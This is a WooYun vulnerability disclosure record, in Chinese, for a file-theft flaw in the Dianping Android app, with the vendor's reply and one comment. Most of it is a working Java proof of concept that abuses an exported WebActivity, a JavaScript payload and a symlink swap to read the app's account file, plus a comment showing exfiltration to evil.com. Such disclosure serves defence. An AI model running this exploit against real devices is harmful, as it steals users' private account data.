{"id": 5295, "wybug_id": "wooyun-2013-047085", "wybug_title": "大众点评APP客户端任意数据窃取漏洞（Android版需要本地权限）", "wybug_corp": "大众点评", "wybug_author": "x3xtxt", "wybug_date": "2013-12-26 15:32", "wybug_open_date": "2014-03-26 15:33", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向公众公开  简要描述： 大众点评客户端APP（Android版）的实现存在问题，攻击者构造特定的Intent Object，启动APP中的com.dianping.ui.activity.WebActivity组件，执行特定的JavaScript脚本，可以窃取任意私有文件的内容。  详细说明：  1. 大众点评客户端App包含很多Activities组件，其中的com.dianping.ui.activity.WebActivity组件可以响应任意第三方App发送的Intent Object，接收其中的参数值，调用WebView组件打开参数中指定的url地址（我们此处关注的是file://本地文件域），解析执行其中的代码。2. 利用符号链接，可以绕过文件同源性策略的限制，调用com.dianping.ui.activity.WebActivity组件解析执行特定的JavaScript脚本，可以窃取任意私有文件的内容。详情请参考看漏洞证明代码。   漏洞证明：  \npackage com.example.x3xtxt.demo.dp;import java.io.FileOutputStream;import android.app.Activity;import android.content.ComponentName;import android.content.Context;import android.content.Intent;import android.os.Bundle;import android.view.Menu;import android.widget.Toast;public class MainActivity extends Activity {\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\t/* 这是你想要窃取的目标文件地址 */\t\tString sensitive_file_name = \"/data/data/com.dianping.v1/shared_prefs/account.xml\";\t\t\t\tDP_WebViewReadAnyFilePoC(sensitive_file_name);\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}\tpublic void DP_WebViewReadAnyFilePoC(String targetfile){\t\ttry{\t\t\t// 第一步，将窃取数据的shellpoc.html写入本地，确保任意App都有权访问shellpoc.html。\t\t\tString shell_poc   = \"/data/data/\"+getApplicationContext().getPackageName()+\"/files/shellpoc.html\";\t\t\t\t\t\twrite_payload_file();\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\t// 第二步，调用com.dianping.ui.activity.WebActivity组件打开shellpoc.html文件，载入解析执行其中的JavaScript脚本，\t\t\t// JavaScript脚本中的函数延迟执行，之所以延迟执行是为了配合符号链接绕过文件同源性策略。\t\t\tString pkgName      = \"com.dianping.v1\";\t\t\tString activityName = \"com.dianping.ui.activity.WebActivity\";\t\t\tString url          = \"file://\"+shell_poc;\t\t\t\tIntent intent = new Intent();\t\t\tintent.setAction(\"android.intent.action.VIEW\");\t\t\tintent.setComponent(new ComponentName(pkgName, activityName));\t\t\tintent.putExtra(\"url\", url);\t\t\tintent.putExtra(\"title\", \"android app sec testing\");\t\t\tintent.putExtra(\"openExternal\", true);\t\t\tstartActivity(intent);\t\t\tThread.sleep(2000);\t\t\t// 第三步，当shellpoc.html被载入到WebView中解析执行之后，删除shellpoc.html文件，\t\t\t// 然后创建包含敏感信息的目标私有文件(\"/data/data/com.dianping.v1/shared_prefs/account.xml\")的符号链接，\t\t\t// 符号链接名称和shellpoc.html文件名相同，从而绕过文件同源性策略，读取私有文件的数据。\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/ln\", \"-s\", targetfile, shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\tThread.sleep(5000);\t\t\t\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\t\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t}\t@SuppressWarnings(\"deprecation\")\tpublic void write_payload_file(){\t\tString payloadStr = \"function getContent(){   \\n\" +\"  var url = location.href;                           \\n\" +\"  var xmlhttp;                                       \\n\" +\"  if(window.XMLHttpRequest){                         \\n\" +\"\txmlhttp=new XMLHttpRequest();                     \\n\" +\"  }else{                                             \\n\" +\"\txmlhttp=new ActiveXObject(\\\"Microsoft.XMLHTTP\\\"); \\n\" +\"  }                                                  \\n\" +\"                                                     \\n\" + \"  xmlhttp.onreadystatechange=function()              \\n\" +\"  {                                                  \\n\" +\"\tif (xmlhttp.readyState==4)                        \\n\" +\"\t{                                                 \\n\" +// 实际的攻击过程中只要将alert(xmlhttp.responseText)替换为// document.location.href = 'http://evil.com/receive.php?data'+encodeURIComponent(xmlhttp.responseText)// 即可。\"\t  alert(xmlhttp.responseText);                    \\n\" + \"\t}                                                 \\n\" +\"  }                                                  \\n\" +\"  xmlhttp.open(\\\"GET\\\",url,true);                    \\n\" +\"  xmlhttp.send();                                    \\n\" +\"}                                                    \\n\" +\"                                                     \\n\" + \"setTimeout(getContent,4000);                         \\n\";\t\tString htmlStr = \"<html>                                             \\n\" +                 \"<head><title>Steal Sensitive Information PoC</title></head> \\n\" + \t            \"<body>                                                      \\n\" +                \"  <script type=\\\"text/javascript\\\">                         \\n\" +                       payloadStr                                                 +\t            \"  </script>                                                 \\n\" +\t            \"</body>                                                     \\n\" +\t            \"</html>\";\t\ttry{\t\t\tFileOutputStream fOut = openFileOutput(\"shellpoc.html\", Context.MODE_WORLD_READABLE);\t\t\tfOut.write(htmlStr.getBytes());\t\t\tfOut.close();\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t}\t\tpublic void cmdexec(String[] cmd){\t\ttry{\t\t\tRuntime.getRuntime().exec(cmd);\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t\t\t}\t\tpublic void debugInfo(String msg){\t\tToast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();\t}}\n   修复方案：  关于修复，还是RD自己参照系统功能需求来做限制吧。   版权声明：转载请注明来源 x3xtxt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-12-27 14:25 厂商回复： 谢谢关注点评安全。由于需要攻击者已经有目标机的执行权限（因为需要写入本地文件，而且需要创建符号链接），一般要求用户安装木马程序的情况下才可做到，所以条件比较苛刻，下次版本会限制本地域的访问。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-14 15:06 |    \t\tConer \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        )\t\t \n  这个漏洞居然也只给了 5 rank:(前两天facebook server 端被用软链下载任意文件的case 和这个思路很相似，    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}